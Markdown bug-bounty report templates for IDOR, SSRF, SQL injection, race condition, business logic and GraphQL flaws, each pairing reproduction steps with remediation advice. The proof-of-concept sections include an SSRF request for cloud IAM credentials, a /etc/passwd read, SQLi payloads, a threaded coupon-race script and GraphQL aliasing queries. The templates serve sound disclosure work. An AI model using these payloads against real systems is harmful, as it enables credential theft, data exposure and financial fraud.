## REPORT TEMPLATES PER CLASS

### IDOR / BOLA
```markdown
# IDOR in [Endpoint] — Unauthorized Access to [Resource]

**Target:** target.com
**Severity:** High (or Critical if mass exploitation)
**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5) or
              AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 if no auth needed)

## Summary
[Endpoint] accepts a [user_id/order_id/document_id] parameter without verifying
the requesting user owns the resource. Any authenticated user can access any
other user's [resource] by changing the ID.

## Steps to Reproduce
1. Register account A, capture JWT_A
2. Register account B, capture JWT_B
3. GET /api/v1/[resource]/[A's ID] with JWT_B
4. Observe that B's request returns A's data

## PoC
\`\`\`bash
curl -s "https://target.com/api/v1/resources/123" \
  -H "Authorization: Bearer $JWT_B" | jq .
\`\`\`

## Impact
- Unauthorized read of all [resources] (estimated [N] records)
- Data exposed: PII, financial data, private content
- GDPR/SOC2 compliance violation

## Remediation
Verify resource ownership server-side before returning data:
- Compare `resource.owner_id` against `current_user.id`
- Use centralized authorization layer (AAL/Pundit/Casbin)
```

### SSRF
```markdown
# SSRF in [Feature] — Internal Network Access via [Parameter]

**Target:** target.com
**Severity:** High (Critical if cloud metadata accessible)
**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (7.7)

## Summary
[Feature/endpoint] accepts a URL parameter and fetches it server-side without
proper validation. An attacker can make the server access internal resources.

## Steps to Reproduce
1. POST /api/[feature] with {"url": "http://169.254.169.254/latest/meta-data/"}
2. Observe cloud metadata in response
3. Also test: http://localhost:6379, file:///etc/passwd, http://[collaborator]

## PoC
\`\`\`bash
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
\`\`\`

## Impact
- Cloud metadata access → IAM credentials → full cloud account compromise
- Internal service scanning (Redis, DB, internal APIs)
- File read via file:// protocol

## Remediation
- Block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Use allow-list of permitted external URLs
- Disable redirect following
```

### SQL Injection
```markdown
# SQL Injection in [Parameter] — [Detection Type]

**Target:** target.com
**Severity:** Critical
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0)

## Summary
[Parameter] is passed directly to SQL query without sanitization.
[Boolean/Time-based/Error/Union] based detection confirmed.

## Steps to Reproduce
1. GET /api/search?q=test → normal response
2. GET /api/search?q=test' → 500 error / different response
3. GET /api/search?q=test' AND 1=1-- → normal (true)
4. GET /api/search?q=test' AND 1=2-- → different (false)
5. Confirmed boolean-based blind SQLi

## PoC (extract DB version)
\`\`\`bash
# Boolean-based: check if version is MySQL
curl -s "https://target.com/api/search?q=test' AND @@version LIKE '8%"--' | grep "keyword"
\`\`\`

## Impact
- Full database read (user credentials, PII, business data)
- Authentication bypass
- Potential RCE via xp_cmdshell (MSSQL) / INTO OUTFILE (MySQL)

## Remediation
- Use parameterized queries (prepared statements)
- NEVER concatenate user input into SQL strings
- Apply least-privilege DB user permissions
```

### Race Condition
```markdown
# Race Condition in [Action] — [Impact]

**Target:** target.com
**Severity:** High (Critical if financial impact)
**CVSS 3.1:** AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:N (6.3)

## Summary
[Action endpoint] lacks atomicity. Sending [N] simultaneous requests results
in all [N] being processed, allowing [impact description].

## Steps to Reproduce
1. Capture the [action] request (e.g., POST /api/discount/apply)
2. Send 20 identical requests simultaneously using Turbo Intruder
3. Observe that [N] of [N] requests succeeded (should be 1)
4. Check resource state: [balance deducted N times / discount applied N times]

## PoC (Python — threading)
\`\`\`python
import requests, threading

def exploit(session, url):
    r = session.post(url, json={"code": "WELCOME20"})
    print(f"Status: {r.status_code}, Body: {r.text[:100]}")

session = requests.Session()
session.headers.update({"Cookie": "session=..."})
threads = [threading.Thread(target=exploit, args=(session, "https://target.com/api/discount/apply")) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()
\`\`\`

## Impact
- Unlimited discount/coupon redemption — direct financial loss
- Parallel withdrawal — balance manipulation
- Reward/points abuse

## Remediation
- Use database-level UNIQUE constraints on action+timer
- Implement distributed locking (Redis lock)
- Use optimistic locking with version field
```

### Business Logic / Premium Abuse
```markdown
# [Business Logic / Premium Abuse] in [Feature] — [Impact]

**Target:** target.com
**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N (7.7)

## Summary
[Feature] assumes [incorrect assumption], allowing [impact].

## Steps to Reproduce
1. Start 14-day free trial
2. Let trial expire (or immediately switch plan)
3. Access premium endpoint at /api/premium/[feature]
4. Observe that premium feature still works despite expired/active trial

## Impact
- Unlimited access to paid features without subscription
- Revenue loss for the business
- Premium content exfiltration

## Remediation
- Verify subscription state SERVER-SIDE on every premium endpoint
- Add subscription check middleware
- Invalidate session on plan change
```

### GraphQL
```markdown
# GraphQL [Introspection / Auth Bypass / IDOR] in /graphql

**Target:** target.com/graphql
**Severity:** Medium to Critical depending on impact
**CVSS 3.1:** Varies

## Summary
GraphQL endpoint at /graphql has [issue]. [Impact description].

## Steps to Reproduce
1. Query introspection: POST /graphql {"query": "{__schema{types{name}}}"}
2. [If auth bypass] Test mutations without authentication
3. [If IDOR] Query another user's data via aliasing or batch

## PoC
\`\`\`graphql
# Introspection
query { __schema { types { name fields { name } } } }

# IDOR via aliasing
query {
  user1: user(id: 1) { email role }
  user2: user(id: 2) { email role }
}
\`\`\`

## Remediation
- Disable introspection in production
- Implement field-level authorization
- Rate limit query depth and aliasing
